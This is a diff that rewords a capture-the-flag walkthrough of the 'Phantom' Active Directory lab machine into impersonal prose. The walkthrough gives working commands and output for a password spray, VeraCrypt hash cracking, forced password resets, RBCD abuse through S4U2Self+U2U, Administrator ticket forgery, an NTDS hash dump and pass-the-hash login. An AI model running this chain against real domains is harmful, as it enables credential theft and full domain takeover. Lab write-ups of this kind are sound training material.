@@ -57,7 +57,7 @@ images: ["featured.png", "image.png", "forceChangePassword.png", "addAllowedToAc
 
 ### Domain Discovery
 
-Let's start by identifying the target machine and gathering information about the domain.
+The first step is identifying the target machine and gathering information about the domain.
 
 ```bash
 elliot@exegol:~$ nxc smb 10.129.234.63 --generate-hosts-file hosts
@@ -90,7 +90,7 @@ SMB         10.129.234.63   445    DC               Public          READ
 SMB         10.129.234.63   445    DC               SYSVOL                          Logon server share
 ```
 
-The `Public` share is accessible in read mode. Let's use NetExec's `spider_plus` module to automatically download files:
+The `Public` share is accessible in read mode. NetExec's `spider_plus` module can automatically download its contents:
 
 ```bash
 elliot@exegol:~$ nxc smb phantom.vl -u 'Guest' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=True
@@ -135,7 +135,7 @@ An `.eml` (email) file was downloaded from the `Public` share.
 
 ### Email Analysis
 
-The downloaded file is `tech_support_email.eml`. Let's examine its content:
+The downloaded file is `tech_support_email.eml`. Examining its content:
 
 ```bash
 elliot@exegol:~$ cat tech_support_email.eml
@@ -160,7 +160,7 @@ The email contains a base64-encoded PDF attachment: `welcome_template.pdf`.
 
 ### PDF Extraction
 
-Let's extract the base64 content and decode it:
+Extracting the base64 content and decoding it:
 
 ```bash
 elliot@exegol:~$ grep -A 1000 'filename="welcome_template.pdf"' tech_support_email.eml | grep -v 'filename=' | sed 's/--===============.*//' | tr -d '[:space:]' > welcome_template.base64
@@ -188,7 +188,7 @@ Password: Ph4nt0m@5t4rt!
 
 ### User Enumeration
 
-Before testing the password, we need to obtain the list of domain users. Let's use a RID brute force attack:
+Before testing the password, a list of domain users is needed. A RID brute force attack provides exactly that:
 
 ```bash
 elliot@exegol:~$ nxc smb phantom.vl -u 'Guest' -p '' --rid-brute | grep 'SidTypeUser' | cut -d'\' -f2 | cut -d' ' -f1 > users_list.txt
@@ -229,7 +229,7 @@ vcunningham
 
 ### Password Spray
 
-Let's test the password `Ph4nt0m@5t4rt!` against all users:
+Testing the password `Ph4nt0m@5t4rt!` against all users:
 
 ```bash
 elliot@exegol:~$ nxc smb phantom.vl -u users_list.txt -p 'Ph4nt0m@5t4rt!'
@@ -256,7 +256,7 @@ SMB         10.129.234.63   445    DC               [+] phantom.vl\ibryant:Ph4nt
 
 ### Share Enumeration with ibryant
 
-With `ibryant` credentials, we have access to more shares:
+With `ibryant` credentials, more shares become accessible:
 
 ```bash
 elliot@exegol:~$ nxc smb phantom.vl -u ibryant -p 'Ph4nt0m@5t4rt!' --shares             
@@ -278,7 +278,7 @@ The `Departments Share` is now accessible in read mode.
 
 ### Exploring the Departments Share
 
-Let's use `smbclient-ng` to explore the share structure:
+Using `smbclient-ng` to explore the share structure:
 
 ```bash
 elliot@exegol:~$ smbclientng -d phantom.vl -u ibryant -p 'Ph4nt0m@5t4rt!' --host "10.129.234.63"
@@ -326,7 +326,7 @@ An interesting file: `IT_BACKUP_201123.hc` in the `IT/Backup/` folder. The `.hc`
 
 ### Container Download
 
-Let's download the `IT_BACKUP_201123.hc` file:
+Downloading the `IT_BACKUP_201123.hc` file:
 
 ```bash
 smb: \IT\Backup\> get IT_BACKUP_201123.hc
@@ -338,7 +338,7 @@ smb: \IT\Backup\>
 
 ### Conversion for Hashcat
 
-To crack the VeraCrypt container, we first need to convert it to Hashcat format. Let's use the `veracrypt2hashcat.py` script:
+To crack the VeraCrypt container, it first needs to be converted to Hashcat format using the `veracrypt2hashcat.py` script:
 
 ```bash
 elliot@exegol:~$ python3 veracrypt2hashcat.py IT_BACKUP_201123.hc
@@ -351,7 +351,7 @@ $veracrypt$65bc2466b1604b15a24008d9e3e49a63f4ec7318eea9a9e11eff3943356abf283f406
 
 ### Custom Wordlist Creation
 
-According to the machine hint, we need to create a wordlist based on the company name (`Phantom`) with common mutations (year + special character).
+According to the machine hint, a custom wordlist based on the company name (`Phantom`) with common mutations (year + special character) should do the trick.
 
 **Created wordlist (`passwords.txt`):**
 ```
@@ -366,7 +366,7 @@ Phantom2025!
 
 ### Hashcat Attack
 
-Let's use Hashcat with mode 29421 (VeraCrypt SHA512 + XTS 512 bit):
+Running Hashcat with mode 29421 (VeraCrypt SHA512 + XTS 512 bit):
 
 ```bash
 elliot@exegol:~$ hashcat -m 29421 veraHash passwords.txt
@@ -437,7 +437,7 @@ Stopped: Wed Dec 10 12:58:38 2025
 
 ### Mounting the VeraCrypt Container
 
-Let's mount the container with the found password:
+Mounting the container with the recovered password:
 
 ```bash
 elliot@exegol:~$ sudo veracrypt IT_BACKUP_201123.hc /mnt/ --password='Phantom2023!'
@@ -445,7 +445,7 @@ elliot@exegol:~$ sudo veracrypt IT_BACKUP_201123.hc /mnt/ --password='Phantom202
 
 ### Content Analysis
 
-Let's list the container contents:
+Listing the container contents:
 
 ```bash
 elliot@exegol:~$ ls /mnt/
@@ -469,13 +469,13 @@ The `vyos_backup.tar.gz` file looks promising. VyOS is an open-source network op
 
 ### Extraction and Analysis of VyOS Backup
 
-Let's extract the archive:
+Extracting the archive:
 
 ```bash
 elliot@exegol:~$ tar -xzf vyos_backup.tar.gz
 ```
 
-Let's explore the structure, particularly the configuration file `config/config.boot`:
+Exploring the structure, particularly the configuration file `config/config.boot`:
 
 ```bash
 elliot@exegol:~$ cat config/config.boot
@@ -506,7 +506,7 @@ vpn {
 
 ### Testing Credentials on the Domain
 
-Let's test the password `gB6XTcqVP5MlP7Rc` against all users:
+Testing the password `gB6XTcqVP5MlP7Rc` against all domain users:
 
 ```bash
 elliot@exegol:~$ nxc smb 10.129.234.63 -u users_list.txt -p 'gB6XTcqVP5MlP7Rc'                         
@@ -522,7 +522,7 @@ SMB         10.129.234.63   445    DC               [+] phantom.vl\svc_sspr:gB6X
 
 ### Privilege Verification
 
-Let's verify if `svc_sspr` has administrator privileges:
+Verifying whether `svc_sspr` has administrator privileges:
 
 ```bash
 elliot@exegol:~$ nxc winrm 10.129.234.63 -u users_list.txt -p 'gB6XTcqVP5MlP7Rc'
@@ -538,7 +538,7 @@ The `svc_sspr` account has administrator privileges!
 
 ### Obtaining user.txt
 
-Let's connect with Evil-WinRM to retrieve the flag:
+Connecting with Evil-WinRM to retrieve the flag:
 
 ```bash
 elliot@exegol:~$ evil-winrm -i phantom.vl -u svc_sspr -p 'gB6XTcqVP5MlP7Rc'
@@ -571,7 +571,7 @@ Mode                 LastWriteTime         Length Name
 
 ### Enumeration with BloodHound
 
-To understand the domain structure and identify escalation paths, let's use BloodHound:
+To understand the domain structure and identify escalation paths, BloodHound is the go-to tool:
 
 ```bash
 elliot@exegol:~$ nxc ldap dc.phantom.vl -u ibryant -p 'Ph4nt0m@5t4rt!' --bloodhound -c All --dns-server 10.129.234.63
@@ -593,14 +593,14 @@ BloodHound reveals that `svc_sspr` has `ForceChangePassword` rights on several u
 
 ### Changing wsilva's Password
 
-Let's change `wsilva`'s password to obtain an account we control:
+Changing `wsilva`'s password to obtain a controlled account:
 
 ```bash
 elliot@exegol:~$ net rpc password "wsilva" 'Phantom2023!' -U "phantom.vl"/"svc_sspr"%"gB6XTcqVP5MlP7Rc" -S "phantom.vl"
 elliot@exegol:~$ 
 ```
 
-Let's verify the change worked:
+Verifying the change:
 
 ```bash
 elliot@exegol:~$ nxc smb 10.129.234.63 -u wsilva -p 'Phantom2023!'
@@ -608,11 +608,11 @@ SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Buil
 SMB         10.129.234.63   445    DC               [+] phantom.vl\wsilva:Phantom2023! 
 ```
 
-**Success!** We now control the `wsilva` account.
+**Success!** The `wsilva` account is now under control.
 
 ### Attempting Machine Account Creation
 
-To exploit RBCD, we normally need to create a machine account. Let's try:
+To exploit RBCD, a machine account is normally required. Attempting to create one:
 
 ```bash
 elliot@exegol:~$ addcomputer.py -method SAMR -computer-name 'ELLIOT$' -computer-pass 'Phantom2023!' -dc-host 10.129.234.63 PHANTOM/wsilva:'Phantom2023!'
@@ -627,7 +627,7 @@ Indicates that you are attempting to create a machine account (using the standar
 
 ### Checking MachineAccountQuota
 
-Let's check the `MachineAccountQuota` value:
+Checking the `MachineAccountQuota` value:
 
 ```bash
 elliot@exegol:~$ nxc ldap 10.129.234.63 -u wsilva -p 'Phantom2023!' -M maq
@@ -654,7 +654,7 @@ Fortunately, there's a technique that allows exploiting RBCD **without creating 
 - When `MachineAccountQuota` is 0, we can't create machine accounts
 - However, regular user accounts can be added to `msDS-AllowedToActOnBehalfOfOtherIdentity`
 - The S4U2Self+U2U (User-to-User) extension allows using a user account's TGT session key
-- By changing the user's password hash to match the TGT session key, we can use the TGT with `-k` (keytab) mode
+- By changing the user's password hash to match the TGT session key, the TGT can be used with `-k` (Kerberos authentication via ccache)
 
 ### Configuring RBCD
 
@@ -673,9 +673,9 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 **Understanding AddAllowedToAct:**
 
-The `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute (shown in BloodHound as `AddAllowedToAct`) is the core of Resource-Based Constrained Delegation. This attribute specifies which accounts are allowed to delegate authentication to the target service account (`DC$` in our case).
+The `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute (shown in BloodHound as `AddAllowedToAct`) is the core of Resource-Based Constrained Delegation. This attribute specifies which accounts are allowed to delegate authentication to the target service account (`DC$` in this case).
 
-When we configured RBCD, we added `wsilva` to this attribute on `DC$`. This means:
+After configuring RBCD, `wsilva` was added to this attribute on `DC$`. This means:
 - `wsilva` can now request service tickets on behalf of other users for services running as `DC$`
 - The delegation is **resource-based**, meaning it's configured on the target (`DC$`), not the delegating account (`wsilva`)
 - This allows us to use the S4U2Proxy extension to impersonate any user when requesting tickets for `DC$`
@@ -684,7 +684,7 @@ When we configured RBCD, we added `wsilva` to this attribute on `DC$`. This mean
 
 ### Obtaining Administrator Ticket
 
-To use the S4U2Self+U2U technique, we need to:
+The S4U2Self+U2U technique requires the following steps:
 
 1. **Change password to a known value** (for TGT acquisition)
 2. **Obtain a TGT** for `wsilva`
@@ -692,7 +692,7 @@ To use the S4U2Self+U2U technique, we need to:
 4. **Change password to match the session key hash**
 5. **Request a service ticket** using the TGT with `-u2u` flag
 
-Let's start:
+Starting the exploitation:
 
 ```bash
 elliot@exegol:~$ netexec smb dc.phantom.vl -u svc_sspr -p gB6XTcqVP5MlP7Rc -M change-password -o USER=wsilva NEWPASS=Elliot123!
@@ -702,7 +702,7 @@ SMB         10.129.234.63   445    DC               [+] phantom.vl\svc_sspr:gB6X
 CHANGE-P... 10.129.234.63   445    DC               [+] Successfully changed password for wsilva
 ```
 
-Now let's verify RBCD is still configured and obtain a TGT:
+Now verifying that RBCD is still configured, then obtaining a TGT:
 
 ```bash
 elliot@exegol:~$ rbcd.py -delegate-to 'DC$' -delegate-from wsilva -action write phantom/wsilva:'Elliot123!' -dc-ip 10.129.234.63
@@ -733,12 +733,12 @@ The **S4U2Self+U2U (User-to-User)** technique is crucial for this attack:
 **Why This Works:**
 
 - The U2U extension allows a service to use a TGT's session key instead of the user's password
-- By setting the user's password hash to the TGT session key, we can use the TGT with `-k` (keytab) mode
+- By setting the user's password hash to the TGT session key, the TGT can be used with `-k` (Kerberos authentication via ccache)
 - This bypasses the need for the actual password during S4U2Proxy
 
 ### Changing Password with Ticket Hash
 
-To use the S4U2Self+U2U technique, we need to change `wsilva`'s password to match the TGT session key hash. First, let's analyze the ticket:
+To use the S4U2Self+U2U technique, `wsilva`'s password must match the TGT session key hash. First, analyzing the ticket:
 
 ```bash
 elliot@exegol:~$ describeTicket.py wsilva.ccache
@@ -766,7 +766,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 **Extracted session key:** `c41c8fc9733230e7b05f15eca1190998...` (RC4 HMAC)
 
-Let's change the password with this hash:
+Changing the password to this hash value:
 
 ```bash
 elliot@exegol:~$ changepasswd.py -newhashes :c41c8fc9733230e7b05f15eca1190998... phantom/wsilva:'Elliot123!'@dc.phantom.vl
@@ -780,7 +780,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 ### Obtaining a Service Ticket for Administrator
 
-Once the password is changed to match the ticket hash, let's obtain a service ticket impersonating `Administrator`:
+With the password now matching the ticket hash, the next step is obtaining a service ticket impersonating `Administrator`:
 
 ```bash
 elliot@exegol:~$ KRB5CCNAME=wsilva.ccache getST.py -u2u -impersonate Administrator -spn cifs/DC.phantom.vl phantom.vl/wsilva -k -no-pass
@@ -792,14 +792,14 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Saving ticket in Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache
 ```
 
-**Success!** We now have a Kerberos ticket allowing us to impersonate `Administrator` on the domain controller.
+**Success!** This yields a Kerberos ticket that allows impersonating `Administrator` on the domain controller.
 
 **What happened:**
 - `-u2u`: Enables User-to-User authentication, allowing the use of the TGT's session key
 - `-impersonate Administrator`: Requests a ticket for the Administrator account
 - `-spn cifs/DC.phantom.vl`: Specifies the target service (CIFS on the domain controller)
-- `-k`: Uses keytab mode (uses the TGT's session key instead of password)
-- `-no-pass`: Don't prompt for password (we're using the keytab)
+- `-k`: Uses Kerberos authentication via the ccache (leverages the TGT's session key instead of a password)
+- `-no-pass`: No password prompt needed (credentials are provided through the ccache)
 
 ---
 
@@ -807,7 +807,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 ### NTDS Dump with Administrator Ticket
 
-Let's use the ticket to dump the NTDS database (all domain hashes):
+Using the ticket to dump the NTDS database (all domain hashes):
 
 ```bash
 elliot@exegol:~$ KRB5CCNAME=Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache netexec smb dc.phantom.vl --use-kcache --ntds                     
@@ -853,7 +853,7 @@ SMB         dc.phantom.vl   445    DC               [*] grep -iv disabled /root/
 
 ### Accessing root.txt
 
-Let's use the Administrator NTLM hash to connect and retrieve the root flag:
+Using the Administrator NTLM hash to connect and retrieve the root flag:
 
 ```bash
 elliot@exegol:~$ evil-winrm -i 10.129.234.63 -u Administrator -H aa2abd9db4f5984e657f834484512117...
